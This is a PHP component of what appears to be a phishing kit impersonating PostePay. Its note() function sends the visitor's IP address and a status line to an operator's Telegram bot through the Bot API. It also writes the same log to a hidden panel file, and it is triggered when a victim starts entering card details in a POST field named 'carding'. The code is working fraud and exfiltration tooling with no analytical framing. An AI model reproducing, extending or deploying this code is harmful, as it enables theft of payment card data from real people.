<?php 
require '../CONFIGS/CONFIG.1.php';
include "../CONFIGS/GET.IP.php";

function note($statu){
	global $bot_token;
	global $chat_id;
	$c = curl_init();
	curl_setopt($c, CURLOPT_URL, "https://api.telegram.org/bot$bot_token/sendMessage?chat_id=$chat_id&parse_mode=html&text=".urlencode($LOGS="<b>[ 💳.💬.❌ ] •••••••••• 🥂 [ POSTEPAY.STATU ] 🥂</b>\n[ 🔎 ] *  :  [ ".$_SERVER['REMOTE_ADDR']." ]\n[ ⚙️ ] *  :  [ $statu ]"));
	file_put_contents('../../PANEL/STATUS.6jl18sTE8hw714IRP782rJnl576f523d6SY7De655474yG84Fd5h464r612O18Da713254lkOBXX86Wdt0054Ou456kf21tA2rG5/STATUS.php', $LOGS . PHP_EOL, FILE_APPEND);
	curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($c, CURLOPT_FOLLOWLOCATION, true);
	$res =  curl_exec($c);
	curl_close($c);
	
}


if(isset($_POST['carding'])){
	note("💳.💬.❌ CARD IS BEING ENTERED...");
}
?>